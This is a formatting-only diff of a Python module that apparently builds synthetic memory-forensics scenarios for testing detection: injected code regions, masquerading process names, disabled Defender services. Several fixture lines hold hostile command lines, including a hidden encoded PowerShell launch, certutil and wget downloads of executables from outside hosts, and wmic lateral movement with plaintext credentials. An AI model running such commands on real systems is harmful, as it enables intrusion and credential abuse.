@@ -54,15 +54,42 @@ ENCODED = "JABjAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuA
 
 
 def _hidden_process(d: Draft) -> None:
-    d.add_process(7340, EXPLORER, "updater.exe", "C:\\Users\\alice\\AppData\\Roaming\\updater.exe", 70, sources=("psscan",), threads=6)
+    d.add_process(
+        7340,
+        EXPLORER,
+        "updater.exe",
+        "C:\\Users\\alice\\AppData\\Roaming\\updater.exe",
+        70,
+        sources=("psscan",),
+        threads=6,
+    )
 
 
 def _injected_pe(d: Draft) -> None:
-    d.injections.append(region(EXPLORER, "explorer.exe", 0x0000_0000_0520_0000, 0x1D000, "PAGE_EXECUTE_READWRITE", MZ_HEAD, has_pe=True))
+    d.injections.append(
+        region(
+            EXPLORER,
+            "explorer.exe",
+            0x0000_0000_0520_0000,
+            0x1D000,
+            "PAGE_EXECUTE_READWRITE",
+            MZ_HEAD,
+            has_pe=True,
+        )
+    )
 
 
 def _injected_shellcode(d: Draft) -> None:
-    d.injections.append(region(NOTEPAD, "notepad.exe", 0x0000_01F4_5A30_0000, 0x1000, "PAGE_EXECUTE_READWRITE", SHELLCODE_HEAD))
+    d.injections.append(
+        region(
+            NOTEPAD,
+            "notepad.exe",
+            0x0000_01F4_5A30_0000,
+            0x1000,
+            "PAGE_EXECUTE_READWRITE",
+            SHELLCODE_HEAD,
+        )
+    )
 
 
 def _lsass_wrong_parent(d: Draft) -> None:
@@ -74,40 +101,106 @@ def _two_lsass(d: Draft) -> None:
 
 
 def _scvhost(d: Draft) -> None:
-    d.add_process(7020, SERVICES, "scvhost.exe", "C:\\Windows\\scvhost.exe", 66, cmdline="C:\\Windows\\scvhost.exe -k netsvcs")
+    d.add_process(
+        7020,
+        SERVICES,
+        "scvhost.exe",
+        "C:\\Windows\\scvhost.exe",
+        66,
+        cmdline="C:\\Windows\\scvhost.exe -k netsvcs",
+    )
 
 
 def _core_name_public(d: Draft) -> None:
-    d.add_process(7140, SERVICES, "svchost.exe", "C:\\Users\\Public\\svchost.exe", 67, cmdline="C:\\Users\\Public\\svchost.exe -k LocalService")
+    d.add_process(
+        7140,
+        SERVICES,
+        "svchost.exe",
+        "C:\\Users\\Public\\svchost.exe",
+        67,
+        cmdline="C:\\Users\\Public\\svchost.exe -k LocalService",
+    )
 
 
 def _encoded_powershell(d: Draft) -> None:
-    d.add_process(7400, WINWORD, "powershell.exe", PS, 74, cmdline=f"powershell.exe -nop -w hidden -enc {ENCODED}")
+    d.add_process(
+        7400,
+        WINWORD,
+        "powershell.exe",
+        PS,
+        74,
+        cmdline=f"powershell.exe -nop -w hidden -enc {ENCODED}",
+    )
 
 
 def _certutil_download(d: Draft) -> None:
-    d.add_process(7460, 5100, "certutil.exe", WIN + "certutil.exe", 75, cmdline="certutil.exe -urlcache -split -f http://198.51.100.12/p.exe C:\\Users\\Public\\p.exe")
+    d.add_process(
+        7460,
+        5100,
+        "certutil.exe",
+        WIN + "certutil.exe",
+        75,
+        cmdline="certutil.exe -urlcache -split -f http://198.51.100.12/p.exe C:\\Users\\Public\\p.exe",
+    )
 
 
 def _unlinked_dll(d: Draft) -> None:
-    d.artifacts.append(ldr(EXPLORER, "C:\\Users\\alice\\AppData\\Local\\Temp\\msupd.dll", 0x0000_0000_6A40_0000, False, False, False))
+    d.artifacts.append(
+        ldr(
+            EXPLORER,
+            "C:\\Users\\alice\\AppData\\Local\\Temp\\msupd.dll",
+            0x0000_0000_6A40_0000,
+            False,
+            False,
+            False,
+        )
+    )
 
 
 def _service_programdata(d: Draft) -> None:
-    d.artifacts.append(service("UpdaterSvc", "C:\\ProgramData\\Updater\\upd.exe", state="SERVICE_RUNNING"))
+    d.artifacts.append(
+        service("UpdaterSvc", "C:\\ProgramData\\Updater\\upd.exe", state="SERVICE_RUNNING")
+    )
 
 
 def _lsass_external(d: Draft) -> None:
-    d.connections.append(tcp(LSASS, "lsass.exe", "10.0.0.15", 50433, "203.0.113.80", 443, minute=76))
+    d.connections.append(
+        tcp(LSASS, "lsass.exe", "10.0.0.15", 50433, "203.0.113.80", 443, minute=76)
+    )
 
 
 def _cmdline_password(d: Draft) -> None:
-    d.add_process(7520, EXPLORER, "cmd.exe", WIN + "cmd.exe", 77, cmdline="cmd.exe /c net use \\\\10.0.0.9\\c$ /user:CORP\\admin Winter2026!Pw && wmic /node:10.0.0.9 /user:CORP\\admin /password:Winter2026!Pw process call create \"C:\\Windows\\Temp\\run.bat\"")
+    d.add_process(
+        7520,
+        EXPLORER,
+        "cmd.exe",
+        WIN + "cmd.exe",
+        77,
+        cmdline='cmd.exe /c net use \\\\10.0.0.9\\c$ /user:CORP\\admin Winter2026!Pw && wmic /node:10.0.0.9 /user:CORP\\admin /password:Winter2026!Pw process call create "C:\\Windows\\Temp\\run.bat"',
+    )
 
 
 def _combined(d: Draft) -> None:
-    d.add_process(7600, EXPLORER, "svhost.exe", "C:\\Users\\Public\\svhost.exe", 78, sources=("psscan",), threads=4)
-    d.injections.append(region(7600, "svhost.exe", 0x0000_0000_0040_0000, 0x16000, "PAGE_EXECUTE_READWRITE", MZ_HEAD, has_pe=True))
+    d.add_process(
+        7600,
+        EXPLORER,
+        "svhost.exe",
+        "C:\\Users\\Public\\svhost.exe",
+        78,
+        sources=("psscan",),
+        threads=4,
+    )
+    d.injections.append(
+        region(
+            7600,
+            "svhost.exe",
+            0x0000_0000_0040_0000,
+            0x16000,
+            "PAGE_EXECUTE_READWRITE",
+            MZ_HEAD,
+            has_pe=True,
+        )
+    )
 
 
 def _curl_sh(d: Draft) -> None:
@@ -115,15 +208,31 @@ def _curl_sh(d: Draft) -> None:
 
 
 def _bash_password(d: Draft) -> None:
-    d.artifacts.append(bash(BASH, "sshpass -p 'Tr0ub4dor&3' ssh root@10.0.0.31 \"wget http://198.51.100.9/a -O /tmp/a && chmod +x /tmp/a\"", 96))
+    d.artifacts.append(
+        bash(
+            BASH,
+            "sshpass -p 'Tr0ub4dor&3' ssh root@10.0.0.31 \"wget http://198.51.100.9/a -O /tmp/a && chmod +x /tmp/a\"",
+            96,
+        )
+    )
 
 
 def _defender_platform(d: Draft) -> None:
     platform = DEFENDER.replace("4.18.24090.11-0", "4.18.24080.9-0")
-    d.add_process(7800, SERVICES, "MsSense.exe", "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe", 80)
+    d.add_process(
+        7800,
+        SERVICES,
+        "MsSense.exe",
+        "C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe",
+        80,
+    )
     d.artifacts += [
         service("WinDefend", f'"{platform}MsMpEng.exe"', state="SERVICE_STOPPED"),
-        service("Sense", '"C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe"', pid=7800),
+        service(
+            "Sense",
+            '"C:\\ProgramData\\Microsoft\\Windows Defender Advanced Threat Protection\\Platform\\10.8760.19045.1001\\MsSense.exe"',
+            pid=7800,
+        ),
         service("WdNisSvc", f"{platform}NisSrv.exe", state="SERVICE_STOPPED"),
     ]
 
@@ -131,7 +240,15 @@ def _defender_platform(d: Draft) -> None:
 def _exited_parent(d: Draft) -> None:
     # A second session: its smss.exe exited (still found by the pool scan, exit time set) after
     # starting csrss.exe and wininit.exe ...
-    d.add_process(7900, 356, "smss.exe", "\\SystemRoot\\System32\\smss.exe", 81, sources=("psscan",), exit_minute=81)
+    d.add_process(
+        7900,
+        356,
+        "smss.exe",
+        "\\SystemRoot\\System32\\smss.exe",
+        81,
+        sources=("psscan",),
+        exit_minute=81,
+    )
     d.add_process(7904, 7900, "csrss.exe", WIN + "csrss.exe", 81)
     d.add_process(7908, 7900, "winlogon.exe", WIN + "winlogon.exe", 81)
     # ... and a third session whose smss.exe pid now belongs to a later, unrelated process
